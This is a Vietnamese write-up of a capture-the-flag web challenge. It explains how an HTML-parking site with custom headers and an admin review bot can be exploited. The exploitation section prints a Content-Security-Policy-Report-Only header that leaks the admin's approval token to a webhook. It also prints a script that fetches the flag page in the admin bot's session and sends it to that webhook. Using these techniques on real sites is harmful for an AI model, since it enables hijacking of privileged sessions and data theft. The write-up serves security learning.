![image](https://github.com/user-attachments/assets/4bf136c2-5f5f-44e8-9f23-c436d253da02)# Tổng quan

![image](https://github.com/user-attachments/assets/fffa382e-540b-46be-be6a-879849fa0c71)

Trang web gồm có 2 phần là paste html và phần headers, phần html là chạy html, headers là khi nhấn "Park my HTML for free", 
nội dung trong ô headers này được gửi đến máy chủ thông qua yêu cầu POST tới /upload, 
máy chủ nhận chuỗi văn bản này và lưu nó vào cột headers trong cơ sở dữ liệu (sqlite.db) tương ứng với trang web

![image](https://github.com/user-attachments/assets/bbdc1566-e2f9-4c6d-b4a3-e3732a9d4b4a)

Tôi thử điền vào html là  `<script>alert(1)</script>` và khi truy cập vào thì không có gì xảy ra

![image](https://github.com/user-attachments/assets/384d09f6-d1d7-437b-8223-5941b887f926)

Vấn đề là server đã sử dụng CSP(Content Security Policy) để chặn xss

![image](https://github.com/user-attachments/assets/cedbf5e5-4f86-44c9-bbba-8d41e6ff1321)

Trong src code thì có một hằng số ADMIN_TOKEN được tạo ra với một chuỗi ngẫu nhiên dài 
Đây là một mã bí mật chỉ admin biết, dùng để đăng nhập vào tài khoản admin

Một hosting_template được định nghĩa. Đây là mẫu HTML chung sẽ bao bọc mã HTML của người dùng khi trang của họ được phục vụ 
Nó chứa các placeholder như {{site.html}}, {{site.id}}, {{site.approveToken}}, và {{CSP}} sẽ được thay thế bằng dữ liệu thực tế

Sử dụng middleware express.urlencoded để đọc dữ liệu từ các biểu mẫu (form) HTML 
Sử dụng express-session để theo dõi người dùng. Mỗi người dùng mới sẽ được gán một 
userId là một số nguyên lớn, ngẫu nhiên (crypto.randomInt(1, SAFE_INTEGER))




sessionRouter.post('/upload')

Chức năng: Xử lý việc người dùng gửi lên mã HTML và các header tùy chọn

Hoạt động:

Nhận html và headers từ nội dung của yêu cầu POST (từ form)

Lấy userId từ session của người dùng hiện tại để xác định chủ sở hữu

Gọi hàm db.createSite() để lưu thông tin này vào cơ sở dữ liệu. Cơ sở dữ liệu sẽ tạo một id và approveToken ngẫu nhiên cho trang web mới

Chuyển hướng người dùng đến trang /site/:id của trang web họ vừa tạo là sessionRouter.get('/site/:id')

![image](https://github.com/user-attachments/assets/97aea477-1b7d-4469-a48d-fb58109153d0)

Tiếp theo là sessionRouter.get('/site/:id')

Chức năng: Hiển thị một trang web đã được tạo. Đây là endpoint phức tạp nhất

Hoạt động:

Lấy id trang web từ URL

Truy vấn cơ sở dữ liệu để lấy thông tin của trang (db.getSiteById)

Kiểm tra quyền truy cập:

Nếu trang web chưa được phê duyệt (site.approved là false), nó chỉ cho phép chủ sở hữu của trang (site.owner) hoặc admin (req.session.userId === 0) xem. Người dùng khác sẽ nhận được lỗi 403 "This site is not approved yet"

Thiết lập Headers: Nếu trang web có lưu các header tùy chỉnh (site.headers), máy chủ sẽ tách chúng ra và thêm vào phản hồi

Thiết lập Content-Security-Policy (CSP):

Nếu trang web chưa được phê duyệt, một CSP rất nghiêm ngặt (default-src 'none') được thêm vào. Điều này ngăn chặn trang web tải bất kỳ tài nguyên nào (kể cả script, ảnh, stylesheet), vô hiệu hóa JavaScript

Nếu trang web đã được phê duyệt, không có CSP nào được thêm vào, cho phép mã HTML và JavaScript của người dùng chạy tự do

Hiển thị HTML: Máy chủ điền thông tin của trang (html, id, approveToken) vào hosting_template và gửi nó cho trình duyệt 
Lưu ý quan trọng: approveToken chỉ được điền vào template nếu người xem là admin (req.session.userId === 0)

![image](https://github.com/user-attachments/assets/bdfcffee-b7c0-4258-8c92-13f6914dcd9b)

noSessionRouter.get('/admin/login')

Chức năng: "Đăng nhập" cho admin bot.
Hoạt động: Endpoint này kiểm tra xem adminToken trong query có khớp với ADMIN_TOKEN trên máy chủ hay không. Nếu có, nó sẽ thiết lập userId trong session thành 0, cấp cho session đó quyền admin

noSessionRouter.get('/review/:siteId')

Chức năng: Kích hoạt quá trình admin xem xét một trang web

Hoạt động:
Khởi chạy một trình duyệt Puppeteer

Tạo một trang mới trong trình duyệt đó

Bước 1: Đăng nhập Admin. Trình duyệt điều hướng đến http://localhost:1337/admin/login?adminToken=... với token chính xác. Thao tác này sẽ thiết lập cookie session với userId=0

Bước 2: Truy cập trang web. Sau khi đăng nhập, trình duyệt điều hướng đến trang web của người dùng (http://localhost:1337/site/:siteId). Vì session giờ đã có quyền admin, nó có thể xem bất kỳ trang nào, kể cả những trang chưa được phê duyệt
Trình duyệt chờ một chút rồi đóng lại

![image](https://github.com/user-attachments/assets/5abea0e6-96fc-4a22-adc1-88cdcc79b111)

sessionRouter.get("/approve/:siteId/:approveToken")

Chức năng: Phê duyệt một trang web

Hoạt động:

Lấy siteId và approveToken từ URL  

Kiểm tra xem approveToken được cung cấp có khớp với token trong cơ sở dữ liệu của trang đó không 
Nếu khớp, nó gọi db.approveSite(siteId) để cập nhật trạng thái approved thành true 
Link để phê duyệt này được hiển thị cho admin khi họ xem một trang chưa được duyệt

![image](https://github.com/user-attachments/assets/ea03dfd3-9d1a-4f0b-a407-3c16ba8fe6dd)

# Khai thác

![image](https://github.com/user-attachments/assets/659be9a7-4f8d-4966-aecb-c24f47f7c9a6)

Ở phần headers tôi để là:
```
Content-Security-Policy-Report-Only: default-src 'none'; report-uri https://webhook.site/efe533b9-16c5-409f-ab18-4c67bed3ae9b
```
Đối với Content-Security-Policy-Report-Only thì header này không thực thi chính sách. Thay vào đó, nó chỉ báo cáo các vi phạm về report-uri được chỉ định.

default-src 'none': Chính sách này, nếu được thực thi, sẽ chặn tất cả mọi thứ. Vì nó đang ở chế độ "chỉ báo cáo", 
nó sẽ coi mọi yêu cầu tài nguyên (script, ảnh, fetch, v.v.) là một vi phạm

report-uri: Khi một vi phạm được phát hiện, trình duyệt sẽ gửi một báo cáo dưới dạng JSON đến webhook

Mỗi khi truy cập vào trang web thì một báo cáo vi phạm sẽ được gửi đến webhook. Báo cáo này chứa thông tin về tài nguyên đã bị chặn (ví dụ: URL của script hoặc ảnh). 
Kẻ tấn công hy vọng rằng thông tin nhạy cảm (như token hoặc cờ) có thể bị rò rỉ qua các báo cáo này


Ở phần headers có để là:

```
<img src="https://test.com/{{site.approveToken}}">
<script>
(async () => {
  try {
    const html = await (await fetch('/site/flag')).text();
    const flag = html.match(/GPNCTF\{[^}]+}/)?.[0] ?? 'no-flag';
    new Image().src = 'https://webhook.site/efe533b9-16c5-409f-ab18-4c67bed3ae9b/abc?flag=' + encodeURIComponent(flag);
  } catch(e) {}
})();
</script>
```
Thẻ `<img>`

khi admin bot truy cập trang, {{site.approveToken}} sẽ 
được thay thế bằng token thực tế, và trình duyệt của bot sẽ gửi token đó đến máy chủ test.com

fetch('/site/flag'): Nó cố gắng tải nội dung của trang bí mật /site/flag. Vì admin bot đã đăng nhập với userId = 0, 
nó có quyền truy cập trang này ngay cả khi nó chưa được phê duyệt. 
html.match(...): Nó dùng biểu thức chính quy để tìm và trích xuất lá cờ (flag) từ nội dung HTML vừa lấy được.

new Image().src = ...: Nó tạo ra một yêu cầu tải ảnh đến webhook, 
nhưng gắn lá cờ đã trích xuất vào như một tham số trong URL (?flag=...). 
Khi bot thực hiện yêu cầu này, lá cờ sẽ xuất hiện trong nhật ký của webhook.

Khi truy cập vào trang thì có giao diện như này

![image](https://github.com/user-attachments/assets/19681f8b-1a05-4c40-bbe2-42a3171773b3)

Và ở webhook có 2 request được gửi tới, trong đó thì chú ý đến request có blocked-uri, theo lý thuyết thì cái token phải xuất hiện ở đó nhưng nó khoogn xuất hiện do cái này thực thi ở 
trình duyệt của tôi (có lộ địa chỉ ip của tôi) chứ không phải của admin, bỏ qua 2 request này vì nó có ý nghĩa là request đã hoạt động được thôi

![image](https://github.com/user-attachments/assets/7109f710-f3b9-4cbd-8114-5ff604144f2a)

Tiếp theo thì truy cập vào review/siteId để bot review site, sau khi vào thì có 2 request mới gửi đến ở địa chỉ ip khác, và địa chỉ này là của con bot, 
ở request có `"blocked-uri": "https://test.com/6184fb1cea6497239f36d4a732055fb4"` cái mã sau chính là approveToken

![image](https://github.com/user-attachments/assets/1651a489-9923-40b9-a338-12a02aa56365)

Đã lấy được approve token thông qua report, truy cập vào /approve/siteId/approveToken bằng token vừa lấy

![image](https://github.com/user-attachments/assets/ab7f380c-9903-4089-a390-66ae2e2c2e68)

Quay lại /review/siteId vì lúc này trang web đã được approve, nó sẽ thực thi được vì site.approved lúc này là bằng 1

![image](https://github.com/user-attachments/assets/0584f4a7-8121-4c43-838e-af4f1860a749)

Nó sẽ thực thi ở bên admin bot là truy cập `fetch('/site/flag')` để lấy flag

![image](https://github.com/user-attachments/assets/42bea80d-69e8-4bca-b7f2-80ddeb2aaa97)

